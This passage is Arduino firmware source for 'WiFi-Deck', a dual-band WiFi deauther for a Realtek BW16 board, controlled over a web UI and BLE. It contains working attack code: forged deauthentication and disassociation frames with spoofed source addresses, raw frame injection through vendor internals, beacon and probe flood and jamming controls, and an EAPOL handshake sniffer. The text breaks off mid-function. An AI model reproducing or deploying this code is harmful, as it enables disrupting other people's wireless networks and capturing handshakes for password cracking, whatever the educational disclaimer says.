/*
   WiFi-Deck - WiFi Dual band deauther with Web Interface

   Based on Evil-BW16 v1.0.2 by 7h30th3r0n3
   Modified to add WiFi Web Server + JSON API + Mobile-friendly HTML UI

   Copyright (c) 2024 7h30th3r0n3 (original)
   WebUI modification: 2026

   Permission is hereby granted, free of charge, to any person obtaining a copy
   of this software and associated documentation files (the "Software"), to deal
   in the Software without restriction, including without limitation the rights
   to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
   copies of the Software, and to permit persons to whom the Software is
   furnished to do so, subject to the following conditions:

   The above copyright notice and this permission notice shall be included in all
   copies or substantial portions of the Software.

   THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
   IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
   FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
   AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
   LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
   OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
   SOFTWARE.

   Disclaimer:
   This tool is developed for educational and ethical testing purposes only.
   Any misuse or illegal use of this tool is strictly prohibited.
   Users must comply with all applicable laws and regulations.
*/

#include <Arduino.h>
#include "wifi_conf.h"
#include "wifi_util.h"
#include "wifi_structures.h"
#include "WiFi.h"
#include "WiFiServer.h"
#include "WiFiClient.h"
#include "platform_stdlib.h"
#include "BLEDevice.h"
#include <FlashMemory.h>

extern "C" {
#include "gap_le.h"
#include "gap_adv.h"
}

#ifdef max
#undef max
#endif
#ifdef min
#undef min
#endif

#include <vector>

//==========================
// User Configuration
//==========================
#define DEFAULT_WIFI_SSID "WiFi-Deck"
#define DEFAULT_WIFI_PASS "12345678"
#define DEFAULT_BLE_NAME  "WiFi-Deck"
#define WIFI_CHANNEL      1

char ap_ssid[33]  = DEFAULT_WIFI_SSID;
char ap_pass[65]  = DEFAULT_WIFI_PASS;
char ble_name[27] = DEFAULT_BLE_NAME;

bool USE_LED = true;
bool apEnabled = true;        // SoftAP/WebUI 是否开启（ap off 后进入 BLE-only 隐身省电模式）
bool pendingApRestart = false; // 延迟重启 SoftAP 标志（确保 BLE/HTTP 响应先发回再重开热点）

// Attack parameters
unsigned long last_cycle     = 0;
unsigned long cycle_delay    = 2000;     // Delay between attack cycles (ms)
unsigned long scan_time      = 5000;     // WiFi scan duration (ms)
unsigned long num_send_frames = 3;
int start_channel            = 1;        // 1 => 2.4GHz start, 36 => 5GHz only
bool scan_between_cycles     = false;    // If true, scans between each attack cycle

uint8_t dst_mac[6]  = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF}; // Broadcast

enum SniffMode {
  SNIFF_ALL,
  SNIFF_BEACON,
  SNIFF_PROBE,
  SNIFF_DEAUTH,
  SNIFF_EAPOL,
  SNIFF_PWNAGOTCHI,
  SNIFF_STOP
};

// Channel hopping configuration
bool isHopping = false;
unsigned long lastHopTime = 0;
const unsigned long HOP_INTERVAL = 500; // 500ms between hops
const int CHANNELS_2GHZ[] = {1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13};
const int CHANNELS_5GHZ[] = {36, 40, 44, 48, 52, 56, 60, 64, 100, 104, 108, 112, 116, 120, 124, 128, 132, 136, 140, 144, 149, 153, 157, 161, 165};
int currentChannelIndex = 0;
int currentChannel = WIFI_CHANNEL; // Default channel

SniffMode currentMode = SNIFF_STOP;  // Start in STOP mode
bool isSniffing = false;             // Global flag to track if sniffing is active

const int MAX_CUSTOM_CHANNELS = 50;
int customChannels[MAX_CUSTOM_CHANNELS];
int numCustomChannels = 0;
bool useCustomChannels = false;

//-------------------
// Timed Attack
//-------------------
bool timedAttackEnabled      = false;
unsigned long attackStartTime = 0;
unsigned long attackDuration  = 10000; // default 10 seconds

//-------------------
// Flood / Jam / Sniff-clone attacks (merged from upstream v1.0.3)
//-------------------
#define BEACON_MAX_SSID_LEN 20

bool beacon_flood_enabled    = false;
unsigned long beacon_flood_delay = 50;   // ms between beacons
unsigned long last_beacon_flood  = 0;
uint16_t beacon_flood_count  = 0;

bool probe_flood_enabled     = false;
unsigned long probe_flood_delay = 30;   // ms between probes
unsigned long last_probe_flood  = 0;
uint16_t probe_flood_count   = 0;

bool signal_jam_enabled     = false;
unsigned long signal_jam_hop_delay = 100; // ms per channel
unsigned long last_signal_jam  = 0;
int signal_jam_ch_index     = 0;
uint16_t signal_jam_count   = 0;

bool deauth_sniff_enabled   = false;
uint8_t sniffed_deauth_src[6] = {0};
bool has_sniffed_deauth     = false;
unsigned long last_deauth_sniff_attack = 0;
unsigned long deauth_sniff_interval = 500;

int single_ap_index = 0;

//==========================================================
// Frame Structures
//==========================================================
// Rotating sequence number counter (must be nonzero; real APs increment)
static uint16_t seq_num_counter = 1;

// Reason code rotation sets for stronger deauth/disassoc
const uint16_t deauth_reasons[] = {1, 2, 4, 6, 7};
const uint16_t disassoc_reasons[] = {1, 2, 3, 8};
const uint8_t num_deauth_reasons = sizeof(deauth_reasons) / sizeof(deauth_reasons[0]);
const uint8_t num_disassoc_reasons = sizeof(disassoc_reasons) / sizeof(disassoc_reasons[0]);

#pragma pack(push, 1)
typedef struct {
  uint16_t frame_control = 0x00C0;  // Deauth (little-endian on wire)
  uint16_t duration = 0x003A;        // Standard duration for management frames
  uint8_t destination[6];
  uint8_t source[6];
  uint8_t access_point[6];
  uint16_t sequence_number = 0;      // Will be set per-frame
  uint16_t reason = 0x0006;
} DeauthFrame;

typedef struct {
  uint16_t frame_control = 0x00A0;  // Disassociation
  uint16_t duration = 0x003A;
  uint8_t destination[6];
  uint8_t source[6];
  uint8_t access_point[6];
  uint16_t sequence_number = 0;      // Will be set per-frame
  uint16_t reason = 0x0008;
} DisassocFrame;
#pragma pack(pop)

//==========================================================
// Data Structures
//==========================================================
struct WiFiScanResult {
  bool selected = false;
  String ssid;
  String bssid_str;
  uint8_t bssid[6];
  short rssi;
  uint channel;
};

struct WiFiStationResult {
  bool selected = false;
  String mac_str;
  uint8_t mac[6];
  short rssi;
};

// Generate a random, locally-administered MAC for flood frames
void randomMAC(uint8_t *mac) {
  for (int i = 0; i < 6; i++) {
    mac[i] = random(0, 256);
  }
  mac[0] = (mac[0] & 0xFE) | 0x02;  // locally administered bit
}

// Forward declarations for functions used before definition
// (Arduino IDE auto-generates these, but explicit is better)
String extractSSID(const uint8_t *frame, int totalLen, int possibleOffset = 36);
bool isPwnagotchiMac(const uint8_t *mac);
bool isEAPOL(const uint8_t *buf, int len);
void startSoftAP();
void pushSniffLog(const char *msg);

// =========================
// 802.11 Header Structure
// =========================
#pragma pack(push, 1)
struct wifi_ieee80211_mac_hdr {
  uint16_t frame_control;
  uint16_t duration_id;
  uint8_t  addr1[6];
  uint8_t  addr2[6];
  uint8_t  addr3[6];
  uint16_t seq_ctrl;
};
#pragma pack(pop)

static inline uint8_t ieee80211_get_type(uint16_t fc) {
  return (fc & 0x0C) >> 2;
}
static inline uint8_t ieee80211_get_subtype(uint16_t fc) {
  return (fc & 0xF0) >> 4;
}
static inline bool is_broadcast_mac(const uint8_t *mac) {
  return mac[0]==0xFF && mac[1]==0xFF && mac[2]==0xFF && mac[3]==0xFF && mac[4]==0xFF && mac[5]==0xFF;
}

// =========================
// Promiscuous Callback
// =========================
void promisc_callback(unsigned char *buf, unsigned int len, void * /*userdata*/) {
  if (currentMode == SNIFF_STOP) return;

  if (!buf || len < sizeof(wifi_ieee80211_mac_hdr)) {
    return;
  }

  wifi_ieee80211_mac_hdr *hdr = (wifi_ieee80211_mac_hdr *)buf;
  uint16_t fc = hdr->frame_control;
  uint8_t ftype = ieee80211_get_type(fc);
  uint8_t fsubtype = ieee80211_get_subtype(fc);

  if (currentMode != SNIFF_ALL) {
    if (currentMode == SNIFF_BEACON && !(ftype == 0 && fsubtype == 8)) return;
    if (currentMode == SNIFF_PROBE && !(ftype == 0 && (fsubtype == 4 || fsubtype == 5))) return;
    if (currentMode == SNIFF_DEAUTH && !(ftype == 0 && (fsubtype == 12 || fsubtype == 10))) return;
    if (currentMode == SNIFF_EAPOL && (ftype != 2 || !isEAPOL(buf, len))) return;
    if (currentMode == SNIFF_PWNAGOTCHI && !(ftype == 0 && fsubtype == 8 && isPwnagotchiMac(hdr->addr2))) return;
  }

  char mac2[18], mac1[18];
  snprintf(mac2, sizeof(mac2), "%02X:%02X:%02X:%02X:%02X:%02X",
           hdr->addr2[0], hdr->addr2[1], hdr->addr2[2],
           hdr->addr2[3], hdr->addr2[4], hdr->addr2[5]);
  snprintf(mac1, sizeof(mac1), "%02X:%02X:%02X:%02X:%02X:%02X",
           hdr->addr1[0], hdr->addr1[1], hdr->addr1[2],
           hdr->addr1[3], hdr->addr1[4], hdr->addr1[5]);

  char logBuf[192];
  const uint8_t *framePtr = (const uint8_t *)buf;

  if (ftype == 0) {
    if (fsubtype == 8) {
      String ssid = extractSSID(framePtr, len, 36);
      if (ssid.length() > 0) {
        snprintf(logBuf, sizeof(logBuf), "[MGMT] Beacon detected %s SSID: %s%s",
                 mac2, ssid.c_str(),
                 isPwnagotchiMac(hdr->addr2) ? " Pwnagotchi Beacon!" : "");
      } else {
        snprintf(logBuf, sizeof(logBuf), "[MGMT] Beacon detected %s", mac2);
      }
    }
    else if (fsubtype == 12) {
      if (len >= 26) {
        uint16_t reasonCode = (uint16_t)buf[24] | ((uint16_t)buf[25] << 8);
        snprintf(logBuf, sizeof(logBuf), "[MGMT] Deauth detected Sender MAC: %s Receiver MAC: %s Reason code: %u",
                 mac2, mac1, (unsigned)reasonCode);
      } else {
        snprintf(logBuf, sizeof(logBuf), "[MGMT] Deauth detected Sender MAC: %s Receiver MAC: %s", mac2, mac1);
      }
      // Capture deauth source MAC for deauth-sniff-and-clone mode
      if (deauth_sniff_enabled && !is_broadcast_mac(hdr->addr1)) {
        memcpy(sniffed_deauth_src, hdr->addr2, 6);
        has_sniffed_deauth = true;
      }
    }
    else if (fsubtype == 4) {
      String ssid = extractSSID(framePtr, len, 24);
      if (ssid.length() > 0) {
        snprintf(logBuf, sizeof(logBuf), "[MGMT] Probe Request Source MAC: %s Probe SSID: %s", mac2, ssid.c_str());
      } else {
        snprintf(logBuf, sizeof(logBuf), "[MGMT] Probe Request Source MAC: %s", mac2);
      }
    }
    else if (fsubtype == 5) {
      String ssid = extractSSID(framePtr, len, 36);
      if (ssid.length() > 0) {
        snprintf(logBuf, sizeof(logBuf), "[MGMT] Probe Response Source MAC: %s SSID: %s", mac2, ssid.c_str());
      } else {
        snprintf(logBuf, sizeof(logBuf), "[MGMT] Probe Response Source MAC: %s", mac2);
      }
    }
    else if (fsubtype == 10) {
      if (len >= 26) {
        uint16_t reasonCode = (uint16_t)buf[24] | ((uint16_t)buf[25] << 8);
        snprintf(logBuf, sizeof(logBuf), "[MGMT] Disassoc detected Sender MAC: %s Receiver MAC: %s Reason code: %u",
                 mac2, mac1, (unsigned)reasonCode);
      } else {
        snprintf(logBuf, sizeof(logBuf), "[MGMT] Disassoc detected Sender MAC: %s Receiver MAC: %s", mac2, mac1);
      }
    }
    else {
      snprintf(logBuf, sizeof(logBuf), "[MGMT] Other subtype = %u", fsubtype);
    }
  }
  else if (ftype == 1) {
    snprintf(logBuf, sizeof(logBuf), "[CTRL] Subtype = %u", fsubtype);
  }
  else if (ftype == 2) {
    if (isEAPOL(buf, len)) {
      snprintf(logBuf, sizeof(logBuf), "[DATA] EAPOL detected! Source MAC: %s Destination MAC: %s", mac2, mac1);
    } else {
      snprintf(logBuf, sizeof(logBuf), "[DATA] Other data frame.");
    }
  }
  else {
    snprintf(logBuf, sizeof(logBuf), "[EXT] Type = %u", ftype);
  }

  Serial.println(logBuf);
  pushSniffLog(logBuf);
}

// =========================
// Utility Functions
// =========================
void setChannel(int newChannel) {
  // 切信道本身无需进入混杂模式；进入混杂模式会关掉 SoftAP 热点，
  // 若在非嗅探态被误触发会导致 WebUI 永久失联。
  currentChannel = newChannel;
  wifi_set_channel(currentChannel);
}

void hopChannel() {
  if (isHopping && (millis() - lastHopTime >= HOP_INTERVAL)) {
    currentChannelIndex++;

    if (useCustomChannels) {
      if (currentChannelIndex >= numCustomChannels) {
        currentChannelIndex = 0;
      }
      currentChannel = customChannels[currentChannelIndex];
    } else {
      static bool use5GHz = false;
      const int num2G = sizeof(CHANNELS_2GHZ) / sizeof(CHANNELS_2GHZ[0]);
      const int num5G = sizeof(CHANNELS_5GHZ) / sizeof(CHANNELS_5GHZ[0]);

      // 频段翻转后必须按新频段数组取值，否则会漏跳 2.4G CH1 与 5G CH36
      if (!use5GHz && currentChannelIndex >= num2G) {
        currentChannelIndex = 0;
        use5GHz = true;
      } else if (use5GHz && currentChannelIndex >= num5G) {
        currentChannelIndex = 0;
        use5GHz = false;
      }
      currentChannel = use5GHz ? CHANNELS_5GHZ[currentChannelIndex] : CHANNELS_2GHZ[currentChannelIndex];
    }

    setChannel(currentChannel);
    Serial.print("[HOP] Switched to channel ");
    Serial.println(currentChannel);
    lastHopTime = millis();
  }
}

void startSniffing() {
  if (!isSniffing) {
    Serial.println("[INFO] Enabling promiscuous mode...");
    wifi_on(RTW_MODE_PROMISC);
    wifi_enter_promisc_mode();
    setChannel(currentChannel);
    wifi_set_promisc(RTW_PROMISC_ENABLE_2, promisc_callback, 1);
    isSniffing = true;
    Serial.println("[INFO] Sniffer initialized and running.");
  }
}

void stopSniffing() {
  if (isSniffing || deauth_sniff_enabled) {
    wifi_set_promisc(RTW_PROMISC_DISABLE, NULL, 0);
    isSniffing = false;
    deauth_sniff_enabled = false;
    has_sniffed_deauth = false;
    currentMode = SNIFF_STOP;
    Serial.println("[CMD] Sniffer stopped");
    if (apEnabled) {
      // Entering promiscuous mode turned the Wi-Fi (and the soft AP) off;
      // bring the AP and web server back up so the phone can reconnect.
      startSoftAP();
      Serial.println("[INFO] Soft AP restarted: " + String(ap_ssid));
    } else {
      // BLE-only stealth mode (ap off): restore STA mode so scan/TX work without broadcasting AP
      wifi_off();
      delay(20);
      wifi_on(RTW_MODE_STA);
      Serial.println("[INFO] Restored STA mode (BLE-only stealth).");
    }
  }
}

String extractSSID(const uint8_t *frame, int totalLen, int possibleOffset) {
  if (totalLen < possibleOffset + 2) {
    return "";
  }
  int offset = possibleOffset;
  // 遍历 IE TLV，直到找到 SSID (tag 0) 或超出边界
  while (offset + 2 <= totalLen) {
    uint8_t tagNumber = frame[offset];
    uint8_t tagLength = frame[offset + 1];
    if (offset + 2 + tagLength > totalLen) break;  // 畸形长度，停止
    if (tagNumber == 0) {
      String essid;
      essid.reserve(tagLength);
      for (int i = 0; i < tagLength; i++) {
        uint8_t c = frame[offset + 2 + i];
        // 保留可打印 ASCII 与 UTF-8 多字节(>=0x80，含中文)，仅丢弃 ASCII 控制符
        if (c >= 0x20) {
          essid += (char)c;
        }
      }
      return essid;
    }
    offset += 2 + tagLength;
  }
  return "";
}

bool isPwnagotchiMac(const uint8_t *mac) {
  const uint8_t pwnMac[6] = {0xDE, 0xAD, 0xBE, 0xEF, 0xDE, 0xAD};
  for (int i = 0; i < 6; i++) {
    if (mac[i] != pwnMac[i]) return false;
  }
  return true;
}

bool isEAPOL(const uint8_t *buf, int len) {
  if (!buf || len < 32) return false;
  uint8_t ftype = (buf[0] & 0x0C) >> 2;
  if (ftype != 2) return false; // 必须是 Data 帧
  // 精确计算 802.11 帧头长度，覆盖 QoS / 4-Address(WDS) / +HTC 变体
  int hdrLen = 24;
  if ((buf[1] & 0x03) == 0x03) hdrLen += 6; // ToDS=1 & FromDS=1 -> 4-Address，多 6 字节
  if ((buf[0] & 0x80) != 0)    hdrLen += 2; // QoS Data (Subtype bit3)
  if ((buf[1] & 0x80) != 0)    hdrLen += 4; // +HTC (Order bit)
  if (len < hdrLen + 8) return false;
  // LLC/SNAP (AA AA 03 00 00 00) + EtherType 0x888E (EAPOL)
  return (buf[hdrLen] == 0xAA && buf[hdrLen + 1] == 0xAA && buf[hdrLen + 2] == 0x03 &&
          buf[hdrLen + 3] == 0x00 && buf[hdrLen + 4] == 0x00 && buf[hdrLen + 5] == 0x00 &&
          buf[hdrLen + 6] == 0x88 && buf[hdrLen + 7] == 0x8E);
}

//==========================================================
// Externs & Prototypes (Realtek / Ameba Specific)
//==========================================================
extern uint8_t* rltk_wlan_info;
extern "C" void* alloc_mgtxmitframe(void* ptr);
extern "C" void update_mgntframe_attrib(void* ptr, void* frame_control);
extern "C" int dump_mgntframe(void* ptr, void* frame_control);
extern "C" int wifi_get_mac_address(char *mac);

void wifi_tx_raw_frame(void* frame, size_t length);
void wifi_tx_deauth_frame(const void* src_mac, const void* dst_mac, uint16_t reason = 0x06);
void wifi_tx_disassoc_frame(const void* src_mac, const void* dst_mac, uint16_t reason = 0x08);
int scanNetworks();
void printScanResults();
void handleCommand(String command);
void targetAttack();
void generalAttack();
void attackCycle();
void startTimedAttack(unsigned long durationMs);
void checkTimedAttack();
void handleWebClient();
String getScanResultsJSON();
String getStatusJSON();
String getInfoJSON();
String jsonEscape(const String &s);
extern const char INDEX_HTML[];

//==========================================================
// Global Vectors
//==========================================================
std::vector<WiFiScanResult> scan_results;
std::vector<WiFiScanResult> target_aps;

//==========================================================
// Disassociation Attack Control
//==========================================================
bool disassoc_enabled           = false;
unsigned long disassoc_interval = 1000;
unsigned long last_disassoc_attack = 0;
bool attack_enabled             = false;
bool scan_enabled               = false;
bool target_mode                = false;
uint32_t tx_success_count       = 0;
uint32_t tx_fail_count          = 0;

//==========================================================
// BLE (Nordic UART Service) — Android App control channel
//==========================================================
#define UART_SERVICE_UUID       "6E400001-B5A3-F393-E0A9-E50E24DCCA9E"
#define CHARACTERISTIC_UUID_RX  "6E400002-B5A3-F393-E0A9-E50E24DCCA9E"
#define CHARACTERISTIC_UUID_TX  "6E400003-B5A3-F393-E0A9-E50E24DCCA9E"
#define BLE_BUF_SIZE            220   // < CHAR_VALUE_MAX_LEN (230)
#define LOG_RING_SIZE           16

BLEService UartService(UART_SERVICE_UUID);
BLECharacteristic BleRx(CHARACTERISTIC_UUID_RX);
BLECharacteristic BleTx(CHARACTERISTIC_UUID_TX);
BLEAdvertData advdata;
BLEAdvertData scndata;
volatile bool bleNotifyEnabled = false;
volatile uint8_t activeConnId = 0;  // 当前 BLE 连接 ID（configServer(1) 下恒为 0，但语义上应记录回调传入值）

// Cross-thread command ring queue (BLE task -> loop)
#define CMD_RING_SIZE 8
char cmdRing[CMD_RING_SIZE][BLE_BUF_SIZE];
volatile uint8_t cmdHead = 0;
volatile uint8_t cmdTail = 0;

// Cross-thread sniff log ring buffer (WiFi promisc thread -> loop)
char sniffLogRing[LOG_RING_SIZE][160];
volatile uint8_t logHead = 0;
volatile uint8_t logTail = 0;

//==========================================================
// Flash Persistence (NVS Config Storage)
//==========================================================
#define CFG_MAGIC 0x57444B32UL  // "WDK2"

#pragma pack(push, 1)
struct PersistConfig {
  uint32_t magic;
  char ap_ssid[33];
  char ap_pass[65];
  char ble_name[27];
  uint32_t cycle_delay;
  uint32_t scan_time;
  uint32_t num_send_frames;
  int32_t start_channel;
  uint8_t scan_between_cycles;
  uint8_t use_led;
};
#pragma pack(pop)

void loadConfigFromFlash() {
  FlashMemory.read();
  PersistConfig cfg;
  memcpy(&cfg, FlashMemory.buf, sizeof(PersistConfig));
  if (cfg.magic != CFG_MAGIC) {
    Serial.println("[CFG] No valid flash config found, using defaults.");
    return;
  }
  cfg.ap_ssid[32] = '\0';
  cfg.ap_pass[64] = '\0';
  cfg.ble_name[26] = '\0';

  if (strlen(cfg.ap_ssid) >= 1 && strlen(cfg.ap_ssid) <= 32) {
    strcpy(ap_ssid, cfg.ap_ssid);
  }
  if (strlen(cfg.ap_pass) >= 8 && strlen(cfg.ap_pass) <= 63) {
    strcpy(ap_pass, cfg.ap_pass);
  }
  if (strlen(cfg.ble_name) >= 1 && strlen(cfg.ble_name) <= 26) {
    strcpy(ble_name, cfg.ble_name);
  }
  if (cfg.cycle_delay >= 100 && cfg.cycle_delay <= 60000) {
    cycle_delay = cfg.cycle_delay;
  }
  if (cfg.scan_time >= 500 && cfg.scan_time <= 30000) {
    scan_time = cfg.scan_time;
  }
  if (cfg.num_send_frames >= 1 && cfg.num_send_frames <= 100) {
    num_send_frames = cfg.num_send_frames;
  }
  if (cfg.start_channel == 1 || cfg.start_channel >= 36) {
    start_channel = cfg.start_channel;
  }
  scan_between_cycles = (cfg.scan_between_cycles != 0);
  USE_LED = (cfg.use_led != 0);
  Serial.println("[CFG] Loaded config from Flash: SSID='" + String(ap_ssid) + "', BLE='" + String(ble_name) + "'");
}

void saveConfigToFlash() {
  PersistConfig cfg;
  memset(&cfg, 0, sizeof(PersistConfig));
  cfg.magic = CFG_MAGIC;
  strncpy(cfg.ap_ssid, ap_ssid, sizeof(cfg.ap_ssid) - 1);
  strncpy(cfg.ap_pass, ap_pass, sizeof(cfg.ap_pass) - 1);
  strncpy(cfg.ble_name, ble_name, sizeof(cfg.ble_name) - 1);
  cfg.cycle_delay = cycle_delay;
  cfg.scan_time = scan_time;
  cfg.num_send_frames = num_send_frames;
  cfg.start_channel = start_channel;
  cfg.scan_between_cycles = scan_between_cycles ? 1 : 0;
  cfg.use_led = USE_LED ? 1 : 0;

  FlashMemory.read();
  memcpy(FlashMemory.buf, &cfg, sizeof(PersistConfig));
  FlashMemory.update();
}

//==========================================================
// Web Server
//==========================================================
WiFiServer webServer(80);

void startSoftAP() {
  // Close any previous listening socket before tearing down WLAN to prevent lwIP socket leak
  webServer.end();
  // Force-close WLAN first: after promisc mode WLAN0 is still "running", so a
  // bare wifi_on(RTW_MODE_AP) would be blocked by rltk_wlan_running() and the
  // radio would never switch back to AP.
  wifi_off();
  delay(20);
  char ch[4];
  snprintf(ch, sizeof(ch), "%d", WIFI_CHANNEL);
  // WiFi.apbegin() completes the full stack init that wifi_start_ap() skips:
  // wifi_on + LwIP_Init + netif_set_addr(192.168.1.1) + dhcps_init (DHCP server).
  WiFi.apbegin(ap_ssid, ap_pass, ch, 0);
  webServer.begin();
  apEnabled = true;
}

//==========================================================
// BLE helpers (Nordic UART Service)
//==========================================================
void pushSniffLog(const char *msg) {
  uint8_t next = (logHead + 1) % LOG_RING_SIZE;
  if (next != logTail) {
    strncpy(sniffLogRing[logHead], msg, 159);
    sniffLogRing[logHead][159] = '\0';
    logHead = next;
  }
}

void bleSendLine(const String &line) {
  if (!BLE.connected(activeConnId) || !bleNotifyEnabled) return;
  String payload = line + "\n";
  if (payload.length() > BLE_BUF_SIZE - 1) {
    // 超长兜底：直接丢弃，避免发送截断后的坏 JSON 污染手机端行缓冲
    Serial.println("[BLE] drop oversize line");
    return;
  }
  BleTx.setData((uint8_t*)payload.c_str(), payload.length());
  BleTx.notify(activeConnId);
  delay(8);  // give the BLE stack time to drain the connection interval
}

void bleWriteCB(BLECharacteristic* chr, uint8_t connID) {
  activeConnId = connID;
  if (chr->getDataLen() > 0) {
    String cmd = chr->readString();
    cmd.trim();
    if (cmd.length() > 0) {
      uint8_t next = (cmdHead + 1) % CMD_RING_SIZE;
      if (next != cmdTail) {
        strncpy(cmdRing[cmdHead], cmd.c_str(), sizeof(cmdRing[0]) - 1);
        cmdRing[cmdHead][sizeof(cmdRing[0]) - 1] = '\0';
        cmdHead = next;  // only advance the ring, never block the BLE task
      }
    }
  }
}

void bleNotifCB(BLECharacteristic* chr, uint8_t connID, uint16_t cccd) {
  activeConnId = connID;
  bleNotifyEnabled = (cccd & GATT_CLIENT_CHAR_CONFIG_NOTIFY);
}

void updateBleName(const char *newName) {
  strncpy(ble_name, newName, sizeof(ble_name) - 1);
  ble_name[sizeof(ble_name) - 1] = '\0';

  BLE.setDeviceName(String(ble_name));
  char gapName[GAP_DEVICE_NAME_LEN] = {0};
  strncpy(gapName, ble_name, GAP_DEVICE_NAME_LEN - 1);
  le_set_gap_param(GAP_PARAM_DEVICE_NAME, GAP_DEVICE_NAME_LEN, gapName);

  advdata.clear();
  advdata.addFlags(GAP_ADTYPE_FLAGS_GENERAL | GAP_ADTYPE_FLAGS_BREDR_NOT_SUPPORTED);
  advdata.addCompleteName(ble_name);
  BLE.configAdvert()->setAdvData(advdata);
  BLE.configAdvert()->updateAdvertParams();
  uint8_t slave_init_mtu_req = true;
  le_set_gap_param(GAP_PARAM_SLAVE_INIT_GATT_MTU_REQ, sizeof(slave_init_mtu_req), &slave_init_mtu_req);
  le_adv_update_param();
}

void setupBLE() {
  advdata.clear();
  advdata.addFlags(GAP_ADTYPE_FLAGS_GENERAL | GAP_ADTYPE_FLAGS_BREDR_NOT_SUPPORTED);
  advdata.addCompleteName(ble_name);
  scndata.clear();
  scndata.addCompleteServices(BLEUUID(UART_SERVICE_UUID));

  BleRx.setWriteProperty(true);
  BleRx.setWriteNRProperty(true);
  BleRx.setWritePermissions(GATT_PERM_WRITE);
  BleRx.setWriteCallback(bleWriteCB);
  BleRx.setBufferLen(BLE_BUF_SIZE);

  BleTx.setNotifyProperty(true);
  BleTx.setCCCDCallback(bleNotifCB);
  BleTx.setBufferLen(BLE_BUF_SIZE);

  UartService.addCharacteristic(BleRx);
  UartService.addCharacteristic(BleTx);

  BLE.init();
  BLE.setDeviceName(String(ble_name));
  BLE.configAdvert()->setAdvData(advdata);
  BLE.configAdvert()->setScanRspData(scndata);
  BLE.configServer(1);
  BLE.addService(UartService);
  BLE.beginPeripheral();
  Serial.println("[INFO] BLE UART service started (" + String(ble_name) + ")");
}

void blePushScanResults() {
  if (!BLE.connected(activeConnId) || !bleNotifyEnabled) return;
  bleSendLine("{\"t\":\"scan_begin\"}");
  for (size_t i = 0; i < scan_results.size(); i++) {
    String line = "{\"t\":\"ap\",\"i\":" + String(i) +
                  ",\"s\":\"" + jsonEscape(scan_results[i].ssid) + "\"" +
                  ",\"b\":\"" + scan_results[i].bssid_str + "\"" +
                  ",\"c\":" + String(scan_results[i].channel) +
                  ",\"r\":" + String(scan_results[i].rssi) + "}";
    bleSendLine(line);
  }
  bleSendLine("{\"t\":\"scan_end\",\"n\":" + String(scan_results.size()) + "}");
}

void blePushStatus() {
  if (!BLE.connected(activeConnId) || !bleNotifyEnabled) return;
  String line = "{\"t\":\"st\"";
  line += ",\"atk\":" + String(attack_enabled ? 1 : 0);
  line += ",\"dis\":" + String(disassoc_enabled ? 1 : 0);
  line += ",\"bcn\":" + String(beacon_flood_enabled ? 1 : 0);
  line += ",\"prb\":" + String(probe_flood_enabled ? 1 : 0);
  line += ",\"jam\":" + String(signal_jam_enabled ? 1 : 0);
  line += ",\"snf\":" + String(deauth_sniff_enabled ? 1 : 0);
  line += ",\"snfOn\":" + String(isSniffing ? 1 : 0);
  line += ",\"sMode\":" + String((int)currentMode);
  line += ",\"hop\":" + String(isHopping ? 1 : 0);
  line += ",\"ch\":" + String(currentChannel);
  line += ",\"ok\":" + String(tx_success_count);
  line += ",\"fail\":" + String(tx_fail_count);
  line += "}";
  bleSendLine(line);
}

void blePushInfo() {
  if (!BLE.connected(activeConnId) || !bleNotifyEnabled) return;
  String line = "{\"t\":\"cfg\"";
  line += ",\"delay\":" + String(cycle_delay);
  line += ",\"scan\":" + String(scan_time);
  line += ",\"frames\":" + String(num_send_frames);
  line += ",\"ch\":" + String(start_channel);
  line += ",\"sc\":" + String(scan_between_cycles ? 1 : 0);
  line += ",\"led\":" + String(USE_LED ? 1 : 0);
  line += ",\"ap\":" + String(apEnabled ? 1 : 0);
  line += "}";
  bleSendLine(line);

  // 独立拆行发送设备名称与密码配置，确保单行严格小于 BLE_BUF_SIZE (220B)
  String idLine = "{\"t\":\"id\"";
  idLine += ",\"ssid\":\"" + jsonEscape(String(ap_ssid)) + "\"";
  idLine += ",\"pass\":\"" + jsonEscape(String(ap_pass)) + "\"";
  idLine += ",\"ble\":\"" + jsonEscape(String(ble_name)) + "\"";
  idLine += "}";
  bleSendLine(idLine);
}

//==========================================================
// Raw Frame Injection
//==========================================================
void wifi_tx_raw_frame(void* frame, size_t length) {
  void *ptr = (void *)**(uint32_t **)(rltk_wlan_info + 0x10);
  if (ptr == NULL) {
    tx_fail_count++;
    Serial.println("[TX ERROR] rltk_wlan_info ptr is NULL!");
    return;
  }
  void *frame_control = alloc_mgtxmitframe((uint8_t*)ptr + 0xae0);

  if (frame_control != 0) {
    update_mgntframe_attrib(ptr, (uint8_t*)frame_control + 8);
    memset((void *) * (uint32_t *)((uint8_t*)frame_control + 0x80), 0, 0x68);
    uint8_t *frame_data = (uint8_t *) * (uint32_t *)((uint8_t*)frame_control + 0x80) + 0x28;
    if (frame_data == NULL) {
      tx_fail_count++;
      Serial.println("[TX ERROR] frame_data is NULL!");
      return;
    }
    memcpy(frame_data, frame, length);
    *(uint32_t *)((uint8_t*)frame_control + 0x14) = length;
    *(uint32_t *)((uint8_t*)frame_control + 0x18) = length;
    int ret = dump_mgntframe(ptr, frame_control);
    if (ret == 0) {
      tx_success_count++;
    } else {
      tx_fail_count++;
      Serial.print("[TX ERROR] dump_mgntframe returned: ");
      Serial.println(ret);
    }
  } else {
    tx_fail_count++;
    Serial.println("[TX ERROR] alloc_mgtxmitframe returned NULL!");
  }
}

void wifi_tx_deauth_frame(const void* src_mac, const void* dst_mac, uint16_t reason) {
  DeauthFrame frame;
  memcpy(&frame.source, src_mac, 6);
  memcpy(&frame.access_point, src_mac, 6);
  memcpy(&frame.destination, dst_mac, 6);
  frame.reason = reason;
  // Rotate sequence number (increment by 1 per frame, fragment=0)
  frame.sequence_number = (seq_num_counter++ << 4) & 0xFFF0;
